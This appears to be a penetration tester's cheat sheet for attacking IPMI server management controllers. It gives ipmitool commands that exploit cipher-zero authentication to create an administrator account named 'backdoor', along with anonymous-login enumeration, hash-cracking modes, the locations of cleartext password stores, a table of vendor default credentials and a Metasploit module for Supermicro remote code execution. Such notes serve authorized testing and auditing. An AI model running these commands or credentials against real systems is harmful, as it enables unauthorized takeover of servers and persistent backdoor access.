# IPMI #
### Restricted SMASH Shell via SSH ###
```
shell ls
shell sh
```
Fixed in firmware but there is a workaround\

### Cracking ###
```
hashcat = m 7300
john = RAKP
```

### Cipher Zero ###
```
ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
	#The number is which user
ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set name 2 backdoor
ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set password 2 password
ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user priv 2 4
ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user enable 2
```

### Anonymous auth ###
```
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
```

### Clear text passwords ###
```
/nv/PSBlock
/nv/PSStore
```

### Default passwords ###
```
Product Name					Default Username	Default Password
HP Integrated Lights Out (iLO)			Administrator	<factory randomized 8-character string>
Dell Remote Access Card (iDRAC, DRAC)		root	calvin
IBM Integrated Management Module (IMM)		USERID	PASSW0RD (with a zero)
Fujitsu Integrated Remote Management Controller	admin	admin
Supermicro IPMI (2.0)				ADMIN	ADMIN
Oracle/Sun Integrated Lights Out Manager (ILOM)	root	changeme
ASUS iKVM BMC					admin	admin
```

### Remote code execution supermicro ###
```
exploit/multi/upnp/libupnp_ssdp_overflow
```

### References ###
```
https://www.rapid7.com/blog/post/2013/11/15/exploiting-the-supermicro-onboard-ipmi-controller/
http://www.staroceans.org/e-book/IPMI-hack.htm
```
